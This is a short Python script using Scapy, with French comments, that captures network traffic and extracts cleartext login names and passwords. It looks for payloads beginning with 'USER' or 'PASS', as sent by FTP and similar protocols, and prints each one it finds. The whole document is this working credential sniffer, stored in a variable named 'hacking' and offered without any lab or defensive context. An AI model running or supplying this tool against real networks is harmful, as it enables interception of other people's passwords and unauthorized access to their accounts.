from scapy.all import *

def loginpass (paquets):
    try:

        if paquets[Raw].load.split(sep=None)[0].decode('latin1') == "USER":  # si dans la première valeur de la liste paquet[i][Raw] = à USER :#
            user = paquets[Raw].load.split(sep=None)[1].decode('latin1')  # prends la deuxième valeur de la liste paquet[i][Raw]#
            print("le nom de l'utilisateur est : ", user)
        elif paquets[Raw].load.split(sep=None)[0].decode('latin1') == "PASS":  # même chose pour le password#
            password = paquets[Raw].load.split(sep=None)[1].decode('latin1')  # même chose pour le password#
            print("le mot de passe  est : ", password)
    except:
        pass

hacking = sniff(prn=loginpass)
